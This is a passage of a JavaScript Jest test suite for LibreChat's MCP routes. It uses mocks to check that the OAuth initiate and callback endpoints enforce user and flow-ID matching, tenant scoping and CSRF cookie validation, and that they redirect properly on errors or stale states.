const crypto = require('crypto');
const express = require('express');
const request = require('supertest');
const mongoose = require('mongoose');
const cookieParser = require('cookie-parser');
const {
  getBasePath,
  PENDING_STALE_MS,
  MCPApiKeyReentryRequiredError,
  MCPOAuthSecretReentryRequiredError,
} = require('@librechat/api');
const { MongoMemoryServer } = require('mongodb-memory-server');

function generateTestCsrfToken(flowId) {
  return crypto
    .createHmac('sha256', process.env.JWT_SECRET)
    .update(flowId)
    .digest('hex')
    .slice(0, 32);
}

const mockRegistryInstance = {
  getServerConfig: jest.fn(),
  getOAuthServers: jest.fn(),
  getAllServerConfigs: jest.fn(),
  ensureConfigServers: jest.fn().mockResolvedValue({}),
  addServer: jest.fn(),
  inspectServerUpdate: jest.fn(),
  commitServerUpdate: jest.fn(),
  updateServer: jest.fn(),
  removeServer: jest.fn(),
  getAllowedDomains: jest.fn().mockReturnValue(null),
  getAllowedAddresses: jest.fn().mockReturnValue(null),
  resolveAllowlists: jest.fn().mockResolvedValue({
    allowedDomains: null,
    allowedAddresses: null,
    useSSRFProtection: true,
  }),
};
let mockMCPUseAllowed = true;
let mockRequestConfig = {};
const mockLoadMCPServerCatalogs = jest.fn().mockResolvedValue({
  serverTools: new Map(),
  serversWithoutTools: [],
});
const defaultMCPAppsPolicy = {
  enabled: false,
  legacyHtmlEnabled: true,
  maxAdmissionRequestsPerMinute: 240,
  maxActiveViews: 3,
  maxActionPreviewChars: 16384,
  maxPersistedAppBytes: 1048576,
};

jest.mock('@librechat/api', () => {
  const actual = jest.requireActual('@librechat/api');
  return {
    ...actual,
    MCPOAuthHandler: {
      initiateOAuthFlow: jest.fn(),
      getFlowState: jest.fn(),
      completeOAuthFlow: jest.fn(),
      generateFlowId: jest.fn(),
      generateTokenFlowId: jest.fn(),
      parseFlowId: jest.fn(),
      buildStoredClientMetadata: jest.fn((metadata, resourceMetadata) =>
        metadata
          ? {
              ...metadata,
              ...(resourceMetadata?.resource && { resource: resourceMetadata.resource }),
            }
          : undefined,
      ),
      resolveStateToFlowId: jest.fn(async (state) => state),
      storeStateMapping: jest.fn(),
      deleteStateMapping: jest.fn(),
      failFlowAndDeleteStateMapping: jest.fn(),
    },
    MCPTokenStorage: {
      storeTokens: jest.fn(),
      getClientInfoAndMetadata: jest.fn(),
      getTokens: jest.fn(),
      deleteUserTokens: jest.fn(),
    },
    getMCPServerGeneration: jest.fn((config) =>
      config.dbId ? `db:${config.dbId}` : `config:${JSON.stringify(config)}`,
    ),
    MCPConnection: {
      clearCooldown: jest.fn(),
    },
    getUserMCPAuthMap: jest.fn(),
    generateCheckAccess: jest.fn(({ permissionType, permissions }) => (req, res, next) => {
      const { PermissionTypes, Permissions } = require('librechat-data-provider');
      const isMCPUseCheck =
        permissionType === PermissionTypes.MCP_SERVERS && permissions.includes(Permissions.USE);
      if (isMCPUseCheck && !mockMCPUseAllowed) {
        return res.status(403).json({ message: 'Forbidden: Insufficient permissions' });
      }
      return next();
    }),
    MCPServersRegistry: {
      getInstance: () => mockRegistryInstance,
    },
  };
});

jest.mock('@librechat/data-schemas', () => ({
  getTenantId: jest.fn(),
  tenantStorage: {
    run: jest.fn((store, fn) => fn()),
  },
  logger: {
    debug: jest.fn(),
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
  },
  createModels: jest.fn(() => ({
    User: {
      findOne: jest.fn(),
      findById: jest.fn(),
    },
    Conversation: {
      findOne: jest.fn(),
      findById: jest.fn(),
    },
  })),
  createMethods: jest.fn(() => ({
    findUser: jest.fn(),
  })),
}));

jest.mock('~/models', () => ({
  findToken: jest.fn(),
  updateToken: jest.fn(),
  createToken: jest.fn(),
  deleteTokens: jest.fn(),
  findPluginAuthsByKeys: jest.fn(),
  getRoleByName: jest.fn(),
}));

jest.mock('~/server/services/Config', () => ({
  setCachedTools: jest.fn(),
  getCachedTools: jest.fn(),
  cacheMCPServerTools: jest.fn(),
  getMCPToolsCacheGeneration: jest.fn().mockResolvedValue('test-generation'),
  invalidateCachedTools: jest.fn(),
  getMCPServerTools: jest.fn(),
  loadCustomConfig: jest.fn(),
  getAppConfig: jest.fn().mockResolvedValue({ mcpConfig: {} }),
}));

jest.mock('~/server/services/Config/mcp', () => ({
  updateMCPServerTools: jest.fn(),
}));

const mockResolveAllMcpConfigs = jest.fn().mockResolvedValue({});
const mockResolveMcpConfigNames = jest.fn().mockResolvedValue([]);
jest.mock('~/server/services/MCP', () => ({
  getMCPSetupData: jest.fn(),
  resolveConfigServers: jest.fn().mockResolvedValue({}),
  resolveMcpConfigNames: (...args) => mockResolveMcpConfigNames(...args),
  resolveAllMcpConfigs: (...args) => mockResolveAllMcpConfigs(...args),
  getServerConnectionStatus: jest.fn(),
}));

jest.mock('~/server/services/PluginService', () => ({
  getUserPluginAuthValue: jest.fn(),
}));

jest.mock('~/server/services/MCP/oauthCleanup', () => ({
  maybeUninstallOAuthMCP: jest.fn().mockResolvedValue(undefined),
}));

jest.mock('~/server/services/MCPAuthorizationFenceRetry', () => ({
  persistMCPAuthorizationFenceRetry: jest.fn().mockResolvedValue(undefined),
  clearMCPAuthorizationFenceRetry: jest.fn().mockResolvedValue(undefined),
}));

jest.mock('~/config', () => ({
  getMCPManager: jest.fn(),
  getFlowStateManager: jest.fn(),
  getOAuthReconnectionManager: jest.fn(),
  getMCPServersRegistry: jest.fn(() => mockRegistryInstance),
}));

jest.mock('~/cache', () => ({
  getLogStores: jest.fn(),
}));

jest.mock('~/server/middleware', () => ({
  requireJwtAuth: (req, res, next) => next(),
  configMiddleware: (req, res, next) => {
    req.config = mockRequestConfig;
    next();
  },
  canAccessMCPServerResource: () => (req, res, next) => next(),
}));

jest.mock(
  '~/server/middleware/limiters/mcpAppAdmissionLimiter',
  () => (_req, _res, next) => next(),
);

jest.mock('~/server/services/Tools/mcp', () => ({
  reinitMCPServer: jest.fn(),
  loadMCPServerCatalogs: (...args) => mockLoadMCPServerCatalogs(...args),
}));

const mockOAuthCompletion = (tokens) => {
  const { MCPOAuthHandler } = require('@librechat/api');
  MCPOAuthHandler.completeOAuthFlow.mockImplementation(
    async (flowId, _code, flowManager, _headers, persistBeforeComplete) => {
      let completed = false;
      const completePersistedFlow = async (storedTokens) => {
        await flowManager.completeFlow(flowId, 'mcp_oauth', storedTokens);
        completed = true;
      };
      const storedTokens = await persistBeforeComplete(tokens, completePersistedFlow);
      if (!completed) {
        await completePersistedFlow(storedTokens);
      }
      return storedTokens;
    },
  );
};

const createLeasedMcpManager = (connection, overrides = {}) => ({
  clearCatalogRecoveryState: jest.fn(),
  ...overrides,
  withUserConnectionLease: jest.fn((_options, useConnection) => useConnection(connection)),
});

describe('MCP Routes', () => {
  let app;
  let mongoServer;
  let mcpRouter;
  let currentUser;

  beforeAll(async () => {
    mongoServer = await MongoMemoryServer.create();
    await mongoose.connect(mongoServer.getUri());

    require('~/db/models');

    mcpRouter = require('../mcp');

    app = express();
    app.use(express.json());
    app.use(cookieParser());

    app.use((req, res, next) => {
      req.user = currentUser ?? { id: 'test-user-id' };
      next();
    });

    app.use('/api/mcp', mcpRouter);
  });

  afterAll(async () => {
    await mongoose.disconnect();
    await mongoServer.stop();
  });

  beforeEach(() => {
    jest.clearAllMocks();
    mockLoadMCPServerCatalogs.mockResolvedValue({
      serverTools: new Map(),
      serversWithoutTools: [],
    });
    currentUser = undefined;
    mockResolveAllMcpConfigs.mockResolvedValue({});
    mockResolveMcpConfigNames.mockResolvedValue([]);
    mockRequestConfig = {};
    // `clearAllMocks` preserves queued `mockReturnValueOnce` entries. A callback
    // test can legitimately leave one unconsumed, which then masks a later test's
    // default implementation when this file shares a CI shard with other suites.
    // Reset the cache accessor itself so every test starts from a deterministic
    // default and can opt into a one-shot value deliberately.
    require('~/cache').getLogStores.mockReset().mockReturnValue({});
    const { MCPOAuthHandler } = require('@librechat/api');
    const { getTenantId } = require('@librechat/data-schemas');
    getTenantId.mockReturnValue(undefined);
    MCPOAuthHandler.generateFlowId.mockImplementation((userId, serverName, tenantId) => {
      const flowId = `${userId}:${serverName}`;
      return tenantId ? `tenant:${encodeURIComponent(tenantId)}:${flowId}` : flowId;
    });
    MCPOAuthHandler.generateTokenFlowId.mockImplementation((userId, serverName, tenantId) => {
      const flowId = `${userId}:${serverName}`;
      return tenantId ? `tenant:${encodeURIComponent(tenantId)}:${flowId}` : flowId;
    });
    MCPOAuthHandler.parseFlowId.mockImplementation((flowId) => {
      const parts = flowId.split(':');
      if (parts[0] === 'tenant') {
        if (parts.length < 4 || !parts[1] || !parts[2]) {
          return null;
        }
        let tenantId;
        try {
          tenantId = decodeURIComponent(parts[1]);
        } catch {
          return null;
        }
        return {
          tenantId,
          userId: parts[2],
          serverName: parts.slice(3).join(':'),
        };
      }
      if (parts.length < 2 || !parts[0]) {
        return null;
      }
      return {
        userId: parts[0],
        serverName: parts.slice(1).join(':'),
      };
    });
    MCPOAuthHandler.buildStoredClientMetadata.mockImplementation((metadata, resourceMetadata) =>
      metadata
        ? {
            ...metadata,
            ...(resourceMetadata?.resource && { resource: resourceMetadata.resource }),
          }
        : undefined,
    );
    mockMCPUseAllowed = true;
    /**
     * Reset registry method implementations every test. `clearAllMocks` resets
     * call records but NOT implementations, so a `.mockRejectedValue(...)` set
     * by an earlier test leaks into later ones — including the new
     * `getServerConfig` lookup in updateMCPServerController.
     */
    mockRegistryInstance.getServerConfig.mockReset().mockResolvedValue(undefined);
    mockRegistryInstance.addServer.mockReset();
    mockRegistryInstance.inspectServerUpdate.mockReset();
    mockRegistryInstance.commitServerUpdate.mockReset();
    mockRegistryInstance.updateServer.mockReset();
    mockRegistryInstance.removeServer.mockReset();
    const cacheService = require('~/server/services/Config');
    cacheService.getMCPServerTools.mockReset().mockResolvedValue(null);
    cacheService.getMCPToolsCacheGeneration.mockReset().mockResolvedValue('test-generation');
    cacheService.cacheMCPServerTools.mockReset().mockResolvedValue(undefined);
    cacheService.invalidateCachedTools.mockReset().mockResolvedValue(undefined);
  });

  it.each([
    '/app/validate',
    '/resources/read',
    '/resources/list',
    '/resources/templates/list',
    '/app-tool-call',
  ])('places the shared App admission limiter immediately after JWT auth on %s', (path) => {
    const routeLayer = mcpRouter.stack.find((layer) => layer.route?.path === path);
    const admissionLimiter = require('~/server/middleware/limiters/mcpAppAdmissionLimiter');

    expect(routeLayer).toBeDefined();
    expect(routeLayer.route.stack[1].handle).toBe(admissionLimiter);
  });

  describe('GET /:serverName/oauth/initiate', () => {
    const { MCPOAuthHandler } = require('@librechat/api');
    const { getLogStores } = require('~/cache');

    it('should reuse stored authorization URL without starting a new OAuth flow', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          createdAt: Date.now(),
          metadata: {
            serverName: 'test-server',
            userId: 'test-user-id',
            authorizationUrl: 'https://oauth.example.com/auth?state=stored-state',
          },
        }),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/test-server/oauth/initiate').query({
        userId: 'test-user-id',
        flowId: 'test-user-id:test-server',
      });

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe('https://oauth.example.com/auth?state=stored-state');
      expect(response.headers['set-cookie']?.join('')).toContain('oauth_csrf=');
      expect(MCPOAuthHandler.initiateOAuthFlow).not.toHaveBeenCalled();
      expect(MCPOAuthHandler.storeStateMapping).not.toHaveBeenCalled();
      expect(mockRegistryInstance.getServerConfig).not.toHaveBeenCalled();
    });

    it('should accept tenant-scoped flow IDs when a tenant is active', async () => {
      const { getTenantId } = require('@librechat/data-schemas');
      getTenantId.mockReturnValue('tenant-a');
      const tenantFlowId = 'tenant:tenant-a:test-user-id:test-server';
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          createdAt: Date.now(),
          metadata: {
            serverName: 'test-server',
            userId: 'test-user-id',
            authorizationUrl: 'https://oauth.example.com/auth?state=stored-state',
          },
        }),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/test-server/oauth/initiate').query({
        userId: 'test-user-id',
        flowId: tenantFlowId,
      });

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe('https://oauth.example.com/auth?state=stored-state');
      expect(mockFlowManager.getFlowState).toHaveBeenCalledWith(tenantFlowId, 'mcp_oauth');
    });

    it('should reject non-tenant flow IDs when a tenant is active', async () => {
      const { getTenantId } = require('@librechat/data-schemas');
      getTenantId.mockReturnValue('tenant-a');
      const mockFlowManager = { getFlowState: jest.fn() };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/test-server/oauth/initiate').query({
        userId: 'test-user-id',
        flowId: 'test-user-id:test-server',
      });

      expect(response.status).toBe(403);
      expect(response.body).toEqual({ error: 'Flow mismatch' });
      expect(mockFlowManager.getFlowState).not.toHaveBeenCalled();
    });

    it('should reject stored authorization URL when flow is no longer pending', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'COMPLETED',
          createdAt: Date.now(),
          metadata: {
            serverName: 'test-server',
            userId: 'test-user-id',
            authorizationUrl: 'https://oauth.example.com/auth?state=stored-state',
          },
        }),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/test-server/oauth/initiate').query({
        userId: 'test-user-id',
        flowId: 'test-user-id:test-server',
      });

      expect(response.status).toBe(400);
      expect(response.body).toEqual({ error: 'Invalid flow state' });
      expect(MCPOAuthHandler.initiateOAuthFlow).not.toHaveBeenCalled();
      expect(MCPOAuthHandler.storeStateMapping).not.toHaveBeenCalled();
    });

    it('should initiate OAuth flow when stored authorization URL is missing', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          createdAt: Date.now(),
          metadata: {
            serverUrl: 'https://test-server.com',
            state: 'old-state-value',
            oauth: { clientId: 'test-client-id' },
          },
        }),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      mockRegistryInstance.getServerConfig.mockResolvedValue({});

      MCPOAuthHandler.initiateOAuthFlow.mockResolvedValue({
        authorizationUrl: 'https://oauth.example.com/auth',
        flowId: 'test-user-id:test-server',
        flowMetadata: { state: 'random-state-value' },
      });
      MCPOAuthHandler.storeStateMapping.mockResolvedValue();
      mockFlowManager.initFlow = jest.fn().mockResolvedValue();

      const response = await request(app).get('/api/mcp/test-server/oauth/initiate').query({
        userId: 'test-user-id',
        flowId: 'test-user-id:test-server',
      });

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe('https://oauth.example.com/auth');
      expect(MCPOAuthHandler.initiateOAuthFlow).toHaveBeenCalledWith(
        'test-server',
        'https://test-server.com',
        'test-user-id',
        {},
        { clientId: 'test-client-id' },
        null,
        undefined,
        null,
        undefined,
      );
      expect(MCPOAuthHandler.deleteStateMapping).toHaveBeenCalledWith(
        'old-state-value',
        mockFlowManager,
      );
      expect(mockFlowManager.initFlow).toHaveBeenCalledWith(
        'test-user-id:test-server',
        'mcp_oauth',
        expect.objectContaining({
          state: 'random-state-value',
          authorizationUrl: 'https://oauth.example.com/auth',
        }),
      );
      expect(MCPOAuthHandler.storeStateMapping).toHaveBeenCalledWith(
        'random-state-value',
        'test-user-id:test-server',
        mockFlowManager,
      );
    });

    it('should return 403 when userId does not match authenticated user', async () => {
      const response = await request(app).get('/api/mcp/test-server/oauth/initiate').query({
        userId: 'different-user-id',
        flowId: 'test-user-id:test-server',
      });

      expect(response.status).toBe(403);
      expect(response.body).toEqual({ error: 'User mismatch' });
    });

    it('should return 403 when flowId does not match authenticated user and server', async () => {
      const response = await request(app).get('/api/mcp/test-server/oauth/initiate').query({
        userId: 'test-user-id',
        flowId: 'other-user-id:test-server',
      });

      expect(response.status).toBe(403);
      expect(response.body).toEqual({ error: 'Flow mismatch' });
      expect(getLogStores).not.toHaveBeenCalled();
    });

    it('should return 403 when flowId query value is not a string', async () => {
      const response = await request(app)
        .get('/api/mcp/test-server/oauth/initiate')
        .query('userId=test-user-id&flowId=test-user-id:test-server&flowId=other-flow');

      expect(response.status).toBe(403);
      expect(response.body).toEqual({ error: 'Flow mismatch' });
      expect(getLogStores).not.toHaveBeenCalled();
    });

    it('should return 404 when flow state is not found', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue(null),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/test-server/oauth/initiate').query({
        userId: 'test-user-id',
        flowId: 'test-user-id:test-server',
      });

      expect(response.status).toBe(404);
      expect(response.body).toEqual({ error: 'Flow not found' });
    });

    it('should return 400 when flow state has missing OAuth config', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          metadata: {
            serverUrl: 'https://test-server.com',
          },
        }),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/test-server/oauth/initiate').query({
        userId: 'test-user-id',
        flowId: 'test-user-id:test-server',
      });

      expect(response.status).toBe(400);
      expect(response.body).toEqual({ error: 'Invalid flow state' });
    });

    it('should return 500 when OAuth initiation throws unexpected error', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockRejectedValue(new Error('Database error')),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/test-server/oauth/initiate').query({
        userId: 'test-user-id',
        flowId: 'test-user-id:test-server',
      });

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ error: 'Failed to initiate OAuth' });
    });

    it('should return 400 when flow state metadata is null', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          id: 'test-user-id:test-server',
          metadata: null,
        }),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/test-server/oauth/initiate').query({
        userId: 'test-user-id',
        flowId: 'test-user-id:test-server',
      });

      expect(response.status).toBe(400);
      expect(response.body).toEqual({ error: 'Invalid flow state' });
    });
  });

  describe('GET /:serverName/oauth/callback', () => {
    const { MCPOAuthHandler, MCPTokenStorage } = require('@librechat/api');
    const { getLogStores } = require('~/cache');
    const mockTokenStorageCommit = (storedTokens) => {
      MCPTokenStorage.storeTokens.mockImplementation(async (params) => {
        const committedTokens = storedTokens ?? params.tokens;
        await params.onStoreCommitted?.(committedTokens);
        return committedTokens;
      });
    };

    beforeEach(() => {
      mockRegistryInstance.getServerConfig.mockResolvedValue({});
    });

    it('should redirect to error page when OAuth error is received', async () => {
      const response = await request(app).get('/api/mcp/test-server/oauth/callback').query({
        error: 'access_denied',
        state: 'test-user-id:test-server',
      });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/error?error=access_denied`);
    });

    describe('OAuth error callback failFlow', () => {
      it('should fail the flow when OAuth error is received with valid CSRF cookie', async () => {
        const flowId = 'test-user-id:test-server';
        const mockFlowManager = {
          getFlowState: jest.fn().mockResolvedValue({
            createdAt: 123,
            metadata: { state: flowId },
          }),
          failFlowIfCurrent: jest.fn().mockResolvedValue('updated'),
        };

        getLogStores.mockReturnValueOnce({});
        require('~/config').getFlowStateManager.mockReturnValueOnce(mockFlowManager);
        MCPOAuthHandler.resolveStateToFlowId.mockResolvedValueOnce(flowId);

        const csrfToken = generateTestCsrfToken(flowId);
        const response = await request(app)
          .get('/api/mcp/test-server/oauth/callback')
          .set('Cookie', [`oauth_csrf=${csrfToken}`])
          .query({
            error: 'invalid_client',
            state: flowId,
          });
        const basePath = getBasePath();

        expect(response.status).toBe(302);
        expect(response.headers.location).toBe(`${basePath}/oauth/error?error=invalid_client`);
        expect(mockFlowManager.failFlowIfCurrent).toHaveBeenCalledWith(
          flowId,
          'mcp_oauth',
          123,
          flowId,
          'invalid_client',
        );
      });

      it('should fail the flow when OAuth error is received with valid session cookie', async () => {
        const flowId = 'test-user-id:test-server';
        const mockFlowManager = {
          getFlowState: jest.fn().mockResolvedValue({
            createdAt: 123,
            metadata: { state: flowId },
          }),
          failFlowIfCurrent: jest.fn().mockResolvedValue('updated'),
        };

        getLogStores.mockReturnValueOnce({});
        require('~/config').getFlowStateManager.mockReturnValueOnce(mockFlowManager);
        MCPOAuthHandler.resolveStateToFlowId.mockResolvedValueOnce(flowId);

        const sessionToken = generateTestCsrfToken('test-user-id');
        const response = await request(app)
          .get('/api/mcp/test-server/oauth/callback')
          .set('Cookie', [`oauth_session=${sessionToken}`])
          .query({
            error: 'invalid_client',
            state: flowId,
          });
        const basePath = getBasePath();

        expect(response.status).toBe(302);
        expect(response.headers.location).toBe(`${basePath}/oauth/error?error=invalid_client`);
        expect(mockFlowManager.failFlowIfCurrent).toHaveBeenCalledWith(
          flowId,
          'mcp_oauth',
          123,
          flowId,
          'invalid_client',
        );
      });

      it('should NOT fail the flow when the error callback carries a superseded state', async () => {
        const flowId = 'test-user-id:test-server';
        const mockFlowManager = {
          getFlowState: jest.fn().mockResolvedValue({
            createdAt: 123,
            metadata: { state: 'current-attempt-state' },
          }),
          failFlowIfCurrent: jest.fn(),
        };

        getLogStores.mockReturnValueOnce({});
        require('~/config').getFlowStateManager.mockReturnValueOnce(mockFlowManager);
        /** Orphaned mapping resolves the superseded state to the current flow */
        MCPOAuthHandler.resolveStateToFlowId.mockResolvedValueOnce(flowId);

        const csrfToken = generateTestCsrfToken(flowId);
        const response = await request(app)
          .get('/api/mcp/test-server/oauth/callback')
          .set('Cookie', [`oauth_csrf=${csrfToken}`])
          .query({
            error: 'access_denied',
            state: 'superseded-attempt-state',
          });
        const basePath = getBasePath();

        expect(response.status).toBe(302);
        expect(response.headers.location).toBe(`${basePath}/oauth/error?error=access_denied`);
        expect(mockFlowManager.failFlowIfCurrent).not.toHaveBeenCalled();
      });

      it('should NOT fail the flow when OAuth error is received without cookies (DoS prevention)', async () => {
        const flowId = 'test-user-id:test-server';
        const mockFlowManager = {
          failFlow: jest.fn(),
        };

        getLogStores.mockReturnValueOnce({});
        require('~/config').getFlowStateManager.mockReturnValueOnce(mockFlowManager);
        MCPOAuthHandler.resolveStateToFlowId.mockResolvedValueOnce(flowId);

        const response = await request(app).get('/api/mcp/test-server/oauth/callback').query({
          error: 'invalid_client',
          state: flowId,
        });
        const basePath = getBasePath();

        expect(response.status).toBe(302);
        expect(response.headers.location).toBe(`${basePath}/oauth/error?error=invalid_client`);
        expect(mockFlowManager.failFlow).not.toHaveBeenCalled();
      });

      it('should redirect instead of hanging when OAuth error flow ID is malformed', async () => {
        const mockFlowManager = {
          failFlow: jest.fn(),
        };

        getLogStores.mockReturnValueOnce({});
        require('~/config').getFlowStateManager.mockReturnValueOnce(mockFlowManager);
        MCPOAuthHandler.resolveStateToFlowId.mockResolvedValueOnce('malformed-flow-id');

        const response = await request(app).get('/api/mcp/test-server/oauth/callback').query({
          error: 'invalid_client',
          state: 'opaque-state',
        });
        const basePath = getBasePath();

        expect(response.status).toBe(302);
        expect(response.headers.location).toBe(`${basePath}/oauth/error?error=invalid_client`);
        expect(mockFlowManager.failFlow).not.toHaveBeenCalled();
      });
    });

    it('should redirect to error page when code is missing', async () => {
      const response = await request(app).get('/api/mcp/test-server/oauth/callback').query({
        state: 'test-user-id:test-server',
      });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/error?error=missing_code`);
    });

    it('should redirect to error page when state is missing', async () => {
      const response = await request(app).get('/api/mcp/test-server/oauth/callback').query({
        code: 'test-auth-code',
      });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/error?error=missing_state`);
    });

    it('should redirect to error page when CSRF cookie is missing', async () => {
      const response = await request(app).get('/api/mcp/test-server/oauth/callback').query({
        code: 'test-auth-code',
        state: 'test-user-id:test-server',
      });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(
        `${basePath}/oauth/error?error=csrf_validation_failed`,
      );
    });

    it('should redirect to error page when CSRF cookie does not match state', async () => {
      const csrfToken = generateTestCsrfToken('different-flow-id');
      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({
          code: 'test-auth-code',
          state: 'test-user-id:test-server',
        });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(
        `${basePath}/oauth/error?error=csrf_validation_failed`,
      );
    });

    it('should redirect to error page when flow state is not found', async () => {
      MCPOAuthHandler.getFlowState.mockResolvedValue(null);
      const flowId = 'invalid-flow:id';
      const csrfToken = generateTestCsrfToken(flowId);

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({
          code: 'test-auth-code',
          state: flowId,
        });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/error?error=invalid_state`);
    });

    it('should redirect to error page when the state cannot be resolved to a flow ID', async () => {
      MCPOAuthHandler.resolveStateToFlowId.mockResolvedValueOnce(null);

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .query({ code: 'test-auth-code', state: 'orphaned-state-value' });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/error?error=invalid_state`);
      expect(MCPOAuthHandler.completeOAuthFlow).not.toHaveBeenCalled();
    });

    it('should reject a stale-state callback without consuming the current flow', async () => {
      const flowId = 'test-user-id:test-server';
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          createdAt: Date.now(),
        }),
        completeFlow: jest.fn().mockResolvedValue(true),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      /** Orphaned mapping from a superseded attempt resolves the old state to the live flow id */
      MCPOAuthHandler.resolveStateToFlowId.mockResolvedValueOnce(flowId);
      MCPOAuthHandler.getFlowState.mockResolvedValue({
        state: 'current-attempt-state',
        serverName: 'test-server',
        userId: 'test-user-id',
        metadata: {},
        clientInfo: {},
        codeVerifier: 'current-verifier',
      });

      const csrfToken = generateTestCsrfToken(flowId);
      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({ code: 'stale-auth-code', state: 'superseded-attempt-state' });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/error?error=invalid_state`);
      expect(MCPOAuthHandler.completeOAuthFlow).not.toHaveBeenCalled();
      expect(MCPTokenStorage.storeTokens).not.toHaveBeenCalled();
      expect(mockFlowManager.completeFlow).not.toHaveBeenCalled();
    });

    it('should let the current tab complete after a stale callback burned the CSRF cookie', async () => {
      const flowId = 'test-user-id:test-server';
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          createdAt: Date.now(),
        }),
        completeFlow: jest.fn().mockResolvedValue(true),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      MCPOAuthHandler.getFlowState.mockResolvedValue({
        state: flowId,
        serverName: 'test-server',
        userId: 'test-user-id',
        metadata: {},
        clientInfo: {},
        codeVerifier: 'current-verifier',
      });
      mockOAuthCompletion({ access_token: 'test-token' });
      mockTokenStorageCommit();
      mockRegistryInstance.getServerConfig.mockResolvedValue({});

      const mockMcpManager = createLeasedMcpManager({
        fetchToolsSnapshot: jest.fn().mockResolvedValue({ tools: [], complete: true }),
      });
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      require('~/config').getOAuthReconnectionManager.mockReturnValue({
        clearReconnection: jest.fn(),
      });
      require('~/server/services/Config/mcp').updateMCPServerTools.mockResolvedValue();

      MCPOAuthHandler.resolveStateToFlowId.mockResolvedValueOnce(flowId);
      const csrfToken = generateTestCsrfToken(flowId);
      const staleResponse = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({ code: 'stale-auth-code', state: 'superseded-attempt-state' });

      const basePath = getBasePath();
      expect(staleResponse.status).toBe(302);
      expect(staleResponse.headers.location).toBe(`${basePath}/oauth/error?error=invalid_state`);
      expect(MCPOAuthHandler.completeOAuthFlow).not.toHaveBeenCalled();

      /** The stale callback consumed the CSRF cookie; the current tab recovers via the fresh PENDING flow */
      const legitResponse = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .query({ code: 'current-auth-code', state: flowId });

      expect(legitResponse.status).toBe(302);
      expect(legitResponse.headers.location).toContain(`${basePath}/oauth/success`);
      expect(MCPOAuthHandler.completeOAuthFlow).toHaveBeenCalledTimes(1);
    });

    describe('CSRF fallback via active PENDING flow', () => {
      it('should proceed when a fresh PENDING flow exists and no cookies are present', async () => {
        const flowId = 'test-user-id:test-server';
        const pendingCreatedAt = Date.now();
        const mockFlowManager = {
          getFlowState: jest.fn().mockResolvedValue({
            type: 'mcp_get_tokens',
            status: 'PENDING',
            createdAt: pendingCreatedAt,
          }),
          completeFlow: jest.fn().mockResolvedValue(true),
          settleFlowIfCurrent: jest.fn().mockResolvedValue('updated'),
          deleteFlow: jest.fn().mockResolvedValue(true),
        };
        const mockFlowState = {
